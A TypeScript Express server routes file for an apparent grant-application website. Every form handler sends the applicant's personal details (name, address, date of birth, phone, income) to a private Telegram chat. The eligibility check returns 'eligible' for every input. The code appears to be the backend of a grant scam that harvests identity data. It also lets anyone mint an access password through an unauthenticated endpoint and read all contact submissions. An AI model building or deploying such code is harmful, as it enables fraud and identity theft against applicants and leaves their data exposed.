import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertContactSubmissionSchema } from "@shared/schema";
import { z } from "zod";
import { generatePassword, addPassword, validatePassword } from "./auth";

// Helper function to send messages to Telegram
async function sendToTelegram(message: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn("Telegram configuration missing - message not sent");
    return;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Telegram API error:", errorData);
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error);
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Generate new password and send to Telegram
  app.post("/api/generate-password", async (req, res) => {
    try {
      const password = generatePassword();
      addPassword(password);
      
      const telegramMessage = `
🔐 *NEW ACCESS PASSWORD GENERATED*

*Password:* \`${password}\`
*Valid for:* 24 hours
*Generated at:* ${new Date().toISOString()}

Share this password with authorized users to access the website.
      `.trim();

      await sendToTelegram(telegramMessage);
      
      res.status(200).json({ 
        message: "Password generated and sent to Telegram",
        success: true,
        password: password
      });
    } catch (error) {
      console.error("Error generating password:", error);
      res.status(500).json({ message: "Failed to generate password" });
    }
  });

  // Validate password
  app.post("/api/validate-password", async (req, res) => {
    try {
      const { password } = req.body;
      
      if (!password) {
        return res.status(400).json({ valid: false, message: "Password required" });
      }
      
      const isValid = validatePassword(password);
      
      if (isValid) {
        res.json({ valid: true, message: "Access granted" });
      } else {
        res.json({ valid: false, message: "Invalid or expired password" });
      }
    } catch (error) {
      console.error("Error validating password:", error);
      res.status(500).json({ valid: false, message: "Validation error" });
    }
  });

  // Contact form submission endpoint
  app.post("/api/contact", async (req, res) => {
    try {
      const validatedData = insertContactSubmissionSchema.parse(req.body);
      
      // Send to Telegram
      const telegramMessage = `
🟡 *CONTACT FORM SUBMISSION*

*Name:* ${validatedData.firstName} ${validatedData.lastName}
*Email:* ${validatedData.email}
*Subject:* ${validatedData.subject}

*Message:*
${validatedData.message}

*Timestamp:* ${new Date().toISOString()}
      `.trim();

      await sendToTelegram(telegramMessage);
      
      const submission = await storage.createContactSubmission(validatedData);
      res.status(201).json({ message: "Contact form submitted successfully", id: submission.id });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid form data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Internal server error" });
      }
    }
  });

  // Get contact submissions (for admin purposes - optional)
  app.get("/api/contact-submissions", async (req, res) => {
    try {
      const submissions = await storage.getContactSubmissions();
      res.json(submissions);
    } catch (error) {
      res.status(500).json({ message: "Internal server error" });
    }
  });

  // Grant application submission endpoint
  app.post("/api/grant-application", async (req, res) => {
    try {
      const grantApplicationSchema = z.object({
        firstName: z.string().min(1, "First name is required"),
        lastName: z.string().min(1, "Last name is required"),
        email: z.string().email("Valid email is required"),
        phone: z.string().min(1, "Phone number is required"),
        address: z.string().min(1, "Address is required"),
        city: z.string().min(1, "City is required"),
        state: z.string().min(1, "State is required"),
        zipCode: z.string().min(1, "ZIP code is required"),
        dateOfBirth: z.string().min(1, "Date of birth is required"),
        ssn: z.string().length(4, "Last 4 digits of SSN required"),
        householdSize: z.string().min(1, "Household size is required"),
        monthlyIncome: z.string().min(1, "Monthly income is required"),
        employmentStatus: z.string().min(1, "Employment status is required"),
        grantType: z.string().min(1, "Grant type is required"),
        requestedAmount: z.string().min(1, "Requested amount is required"),
        purpose: z.string().min(10, "Purpose must be at least 10 characters"),
        hasDebts: z.boolean(),
        agreeToTerms: z.boolean(),
        agreeToVerification: z.boolean()
      });

      const validatedData = grantApplicationSchema.parse(req.body);
      
      // Generate application ID
      const applicationId = `APP-${new Date().getFullYear()}-${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}`;
      
      // Send to Telegram
      const telegramMessage = `
🟢 *NEW GRANT APPLICATION*

*Application ID:* ${applicationId}
*Name:* ${validatedData.firstName} ${validatedData.lastName}
*Email:* ${validatedData.email}
*Phone:* ${validatedData.phone}
*Address:* ${validatedData.address}, ${validatedData.city}, ${validatedData.state} ${validatedData.zipCode}
*Date of Birth:* ${validatedData.dateOfBirth}
*Household Size:* ${validatedData.householdSize}
*Monthly Income:* ${validatedData.monthlyIncome}
*Employment Status:* ${validatedData.employmentStatus}
*Grant Type:* ${validatedData.grantType}
*Requested Amount:* ${validatedData.requestedAmount}

*Purpose:*
${validatedData.purpose}

*Has Debts:* ${validatedData.hasDebts ? 'Yes' : 'No'}
*Agreed to Terms:* ${validatedData.agreeToTerms ? 'Yes' : 'No'}
*Agreed to Verification:* ${validatedData.agreeToVerification ? 'Yes' : 'No'}

*Timestamp:* ${new Date().toISOString()}
      `.trim();

      await sendToTelegram(telegramMessage);
      
      // Format data for storage/processing
      const applicationData = {
        ...validatedData,
        applicationId,
        submittedAt: new Date().toISOString(),
        status: 'submitted'
      };

      // Here you would typically save to database
      console.log('Grant application received:', applicationData);

      res.status(201).json({ 
        message: "Grant application submitted successfully",
        applicationId: applicationId,
        submittedAt: applicationData.submittedAt
      });

    } catch (error) {
      console.error("Error in grant application:", error);
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid form data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Failed to submit application. Please try again." });
      }
    }
  });

  // Telegram report submission endpoint
  app.post("/api/telegram-report", async (req, res) => {
    try {
      const telegramReportSchema = z.object({
        applicantName: z.string().min(1, "Applicant name is required"),
        applicationId: z.string().min(1, "Application ID is required"),
        reportType: z.string().min(1, "Report type is required"),
        reportDetails: z.string().min(10, "Report details must be at least 10 characters"),
        contactEmail: z.string().email("Valid email is required"),
        urgencyLevel: z.enum(["low", "normal", "high", "critical"])
      });

      const validatedData = telegramReportSchema.parse(req.body);
      
      // Format message for Telegram
      const urgencyEmoji = {
        low: "🟢",
        normal: "🟡", 
        high: "🟠",
        critical: "🔴"
      };

      const telegramMessage = `
${urgencyEmoji[validatedData.urgencyLevel]} *APPLICATION REPORT*

*Applicant:* ${validatedData.applicantName}
*Application ID:* ${validatedData.applicationId}
*Report Type:* ${validatedData.reportType}
*Urgency:* ${validatedData.urgencyLevel.toUpperCase()}
*Contact Email:* ${validatedData.contactEmail}

*Details:*
${validatedData.reportDetails}

*Timestamp:* ${new Date().toISOString()}
      `.trim();

      // Send to Telegram
      await sendToTelegram(telegramMessage);

      // Store report in database (optional)
      const reportData = {
        ...validatedData,
        submittedAt: new Date().toISOString(),
        telegramSent: true
      };

      res.status(201).json({ 
        message: "Report sent successfully to Telegram support channel",
        reportId: `RPT-${Date.now()}`
      });

    } catch (error) {
      console.error("Error in telegram report:", error);
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid form data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Failed to send report. Please try again." });
      }
    }
  });

  // Eligibility check submission endpoint
  app.post("/api/eligibility-check", async (req, res) => {
    try {
      const eligibilitySchema = z.object({
        fullName: z.string().min(1, "Full name is required"),
        dateOfBirth: z.string().min(1, "Date of birth is required"),
        address: z.string().min(1, "Address is required")
      });

      const validatedData = eligibilitySchema.parse(req.body);
      
      // Send to Telegram
      const telegramMessage = `
🔍 *ELIGIBILITY CHECK SUBMISSION*

*Name:* ${validatedData.fullName}
*Date of Birth:* ${validatedData.dateOfBirth}
*Address:* ${validatedData.address}

*Timestamp:* ${new Date().toISOString()}
      `.trim();

      await sendToTelegram(telegramMessage);

      res.status(200).json({ 
        result: 'eligible',
        message: "Eligibility check completed"
      });

    } catch (error) {
      console.error("Error in eligibility check:", error);
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid form data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Failed to check eligibility. Please try again." });
      }
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
